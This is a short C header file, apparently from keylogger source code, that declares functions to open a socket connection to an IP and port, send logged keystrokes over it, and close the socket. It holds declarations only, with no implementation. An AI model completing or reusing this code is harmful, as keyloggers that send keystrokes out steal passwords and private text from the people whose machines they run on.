#ifndef _send_keylog
#define _send_keylog

SOCKET create_conn(char* ip, int port);
void send_keylog(SOCKET sock, char* key);
void close_socket(SOCKET sock);

#endif